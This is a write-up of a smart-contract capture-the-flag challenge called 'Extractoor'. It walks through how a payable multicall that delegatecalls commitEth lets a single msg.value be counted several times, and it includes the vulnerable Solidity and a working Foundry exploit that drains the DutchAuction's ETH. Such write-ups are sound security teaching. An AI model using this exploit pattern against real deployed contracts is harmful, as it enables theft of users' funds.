---
title: "Mr Steal Yo Crypto — Extractoor"
date: 2023-07-22
draft: false
description: "CTF - 16"
tags: ["CTF"]
series: ["CTF"]
series_order: 16
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---

This is the #16 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real world exploits.
> Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement)

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/freeze/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Extractoor

>[redacted] has launched a dutch auction to sell 1_000_000 of their FARM tokens. So far one degen has aped in 900 ETH.

Your task is to steal at least 90% of the ETH from the DutchAuction contract.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/extractoor)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/16-extractoor.sol)

## Review of the contract

### Test file and DutchAuction.sol

At the beginning, I was thinking about trying to get a lot of FARM tokens and then sell them. But there is no function for selling our token. I decided to not deep dive on `calculateCommitment()`, `priceDrop()`, `tokenPrice()`, `priceFunction()`. It will be useless, the FARM token is not valuable for the challenge.
We want to drain ETH funds, ETH are transferring on `withdrawTokens()`, `finalize()`, and `commitEth()`. We can forget `withdrawTokens()`, `finalize()` due to the condition of being the admin or `block.timestamp > marketInfo.endTime`. The only path for draining funds is `commitEth()`.
After some time, I still don’t know how to drain ether because if we send too much ether, it will send us only the excess ether. So I made a whole review of the contract one more time and it seems that I forgot the multicall contract. What a mistake.

```solidity
contract Multicall {
    /**
    * @dev Receives and executes a batch of function calls on this contract.
    */
    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
}

/**
* @notice Checks the amount of ETH to commit and adds the commitment. Refunds the buyer if commit is too high.
* @param _beneficiary Auction participant ETH address.
*/
function commitEth(address payable _beneficiary) public payable nonReentrant {
    // Get ETH able to be committed
    uint256 ethToTransfer = calculateCommitment(msg.value);
    
    // Accept ETH Payments.
    uint256 ethToRefund = msg.value - ethToTransfer;
    if (ethToTransfer > 0) {
        _addCommitment(_beneficiary, ethToTransfer);
    }
    // Return any ETH to be refunded.
    if (ethToRefund > 0) {
        _beneficiary.transfer(ethToRefund);
    }
}
```

### Vulnerability Exploit

In a previous CTF, I used a vulnerability that combines a loop and the value of `msg.value`. Msg.value is set at the beginning of a call and is immutable:
```solidity
// Here msg.value = 900e18
dutchAuction.commitEth{value: 900e18}(payable(adminUser));
```

Now imagine a function that is payable and does a loop on a function that is also payable:
```solidity
function vulnerable() external payable {
    for (uint i = 0; i < 3; i++) {
        dutchAuction.commitEth(payable(adminUser));
    }
}
```

The fact is that if we call `vulnerable()` and send ether, the `msg.value` inside `vulnerable()` will be the same inside `commitEth()`. And that’s our vulnerability! At the end `commitEth()` is called three times, at each call `msg.value` will be the same.

```solidty
target.vulnerable{value: 100e18}()
// For each time we enter into commitEth
// msg.value is always equal to 100e18
// even if we call it three times inside vulnerable()
// At the end, we only send 100e18 ether and not 300e18 ether
```

Let’s see if this vulnerability is possible with `multicall()`.
Instead of a basic call, `multicall` uses a delegate call. Normally, delegatecall is used for executing the code of an external contract and update the storage of the caller. Well, we don’t care as the contract that is calling is himself. I’m not sure that it makes sense for doing something like that. But it’s good for us.
The parameter for the call is `data[i]`, and we set `data[]`. Basically, we can call every function that we want.
To finish, `multicall` is payable, so we can send ether to the function.

Now we know the vulnerability and have all the requirements for applying it, so let’s go.

```solidity
/// solves the challenge
function testChallengeExploit() public {
    vm.startPrank(attacker, attacker);

    bytes memory call = abi.encodeWithSignature("commitEth(address)", attacker);
    bytes[] memory _data = new bytes[](11);
    for (uint i; i < 11; i++) {
        _data[i] = call;
    }
    
    // We are looping a payable function, so `msg.value` will still be the same even if we call multiple times `commitEth`.
    // The first time we buy 100_000e18 of token, then we withdraw 100 ether per call
    dutchAuction.multicall{value: 100e18}(_data);

    vm.stopPrank();
    validation();
}
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/16-extractoor.sol).

## Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me for writing articles on CTF ^^.
